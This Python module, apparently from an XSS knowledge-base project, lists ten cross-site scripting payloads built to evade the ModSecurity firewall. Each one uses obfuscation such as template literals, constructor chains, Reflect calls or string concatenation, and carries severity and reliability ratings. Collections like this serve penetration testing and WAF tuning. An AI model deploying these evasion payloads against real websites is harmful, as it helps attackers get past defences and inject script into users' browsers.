#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

ModSecurity WAF Bypass Payloads
"""

from ..models import PayloadEntry


MODSECURITY_BYPASS_PAYLOADS = {
    "modsec_bypass_1": PayloadEntry(
        payload="<script>a]lert(1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Bracket in function name (parser confusion)",
        tags=["modsecurity", "script", "parser-confusion"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="low",
    ),
    "modsec_bypass_2": PayloadEntry(
        payload="<script>alert(1)//",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Unclosed script with comment",
        tags=["modsecurity", "script", "unclosed"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="medium",
    ),
    "modsec_bypass_3": PayloadEntry(
        payload="<script>alert`1`</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Template literal call",
        tags=["modsecurity", "script", "template-literal"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="high",
    ),
    "modsec_bypass_4": PayloadEntry(
        payload="<script>alert?.(`1`)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Optional chaining with template literal",
        tags=["modsecurity", "script", "optional-chaining"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="high",
    ),
    "modsec_bypass_5": PayloadEntry(
        payload="<script>[].constructor.constructor('alert(1)')()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Constructor chain to Function",
        tags=["modsecurity", "script", "constructor-chain"],
        waf_evasion=True,
        bypasses=["modsecurity", "cloudflare"],
        reliability="high",
    ),
    "modsec_bypass_6": PayloadEntry(
        payload="<script>Reflect.apply(alert,null,[1])</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Reflect.apply for function call",
        tags=["modsecurity", "script", "reflect"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="high",
    ),
    "modsec_bypass_7": PayloadEntry(
        payload="<script>Reflect.construct(Function,['alert(1)'])()</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Reflect.construct Function",
        tags=["modsecurity", "script", "reflect-construct"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="high",
    ),
    "modsec_bypass_8": PayloadEntry(
        payload="<script>window['al'+'ert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="String concatenation for function name",
        tags=["modsecurity", "script", "string-concat"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="high",
    ),
    "modsec_bypass_9": PayloadEntry(
        payload="<script>self['al'+'ert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="self object with string concat",
        tags=["modsecurity", "script", "self"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="high",
    ),
    "modsec_bypass_10": PayloadEntry(
        payload="<script>top['al'+'ert'](1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="top object with string concat",
        tags=["modsecurity", "script", "top"],
        waf_evasion=True,
        bypasses=["modsecurity"],
        reliability="high",
    ),
}

MODSECURITY_BYPASS_PAYLOADS_TOTAL = len(MODSECURITY_BYPASS_PAYLOADS)
